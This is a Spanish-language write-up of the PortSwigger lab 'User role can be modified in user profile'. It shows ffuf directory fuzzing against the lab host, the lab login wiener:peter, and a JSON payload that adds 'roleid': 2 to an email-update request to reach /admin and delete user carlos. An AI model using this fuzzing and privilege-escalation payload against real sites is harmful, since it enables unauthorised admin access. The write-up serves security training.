---
title: User role can be modified in user profile
description: Laboratorio de Portswigger sobre Broken Access Control
date: 2024-12-04 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Broken Access Control
tags:
  - Portswigger Labs
  - Broken Access Control
  - User role can be modified in user profile
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` tiene un `panel de administración` en `/admin`. Solo es accesible para `usuarios autenticados` con un `roleid` de `2`. Para `resolver` el laboratorio, debemos `acceder` al `panel de administración` y `eliminar` al `usuario carlos`. Podemos `iniciar sesión` en tu nuestra cuenta con las siguientes credenciales `wiener:peter`

---

## Guía de broken access control

`Antes `de `completar` este `laboratorio` es recomendable `leerse` esta `guía de broken access control` [https://justice-reaper.github.io/posts/Broken-Access-Control-Guide/](https://justice-reaper.github.io/posts/Broken-Access-Control-Guide/)

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Broken-Access-Control-Lab-4/image_1.png)

Pulsamos en `My account` y nos logueamos con las credenciales `wiener:peter`

![](/assets/img/Broken-Access-Control-Lab-4/image_2.png)

`Fuzzeamos` rutas y encontramos una llamada `/admin`

```
# ffuf -c -t 20 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://0a0600100345e4df8263e5a700810033.web-security-academy.net/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0a0600100345e4df8263e5a700810033.web-security-academy.net/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ADMIN                   [Status: 401, Size: 2588, Words: 1053, Lines: 54, Duration: 63ms]
Admin                   [Status: 401, Size: 2588, Words: 1053, Lines: 54, Duration: 59ms]
Login                   [Status: 200, Size: 3051, Words: 1287, Lines: 63, Duration: 67ms]
admin                   [Status: 401, Size: 2588, Words: 1053, Lines: 54, Duration: 61ms]
analytics               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
favicon.ico             [Status: 200, Size: 15406, Words: 11, Lines: 1, Duration: 56ms]
filter                  [Status: 200, Size: 10778, Words: 5080, Lines: 199, Duration: 63ms]
login                   [Status: 200, Size: 3051, Words: 1287, Lines: 63, Duration: 61ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
my-account              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
```

Si accedemos a `/admin` nos `muestra` este `mensaje`

![](/assets/img/Broken-Access-Control-Lab-4/image_3.png)

En la parte de `My account` vemos que podemos `actualizar` nuestro `email`

![](/assets/img/Broken-Access-Control-Lab-4/image_4.png)

Si `interceptamos` la `petición` mediante `Burpsuite` vemos esto

![](/assets/img/Broken-Access-Control-Lab-4/image_5.png)

Si `enviamos` la `petición`, esta es la `repuesta` que `recibimos`

![](/assets/img/Broken-Access-Control-Lab-4/image_6.png)

Podemos `enviar` este `payload` en el cual cambiamos nuestro `roleid` a `2` con el fin de `escalar privilegios`

```
{
	"email":"wiener@normal-user.net",
	"roleid": 2
}
```

Una vez `ascendido` nuestro `privilegio` ya podemos `acceder` a `/admin`, `borrar` al usuario `carlos` y `ascender` nuestro `privilegio`

![](/assets/img/Broken-Access-Control-Lab-4/image_7.png)
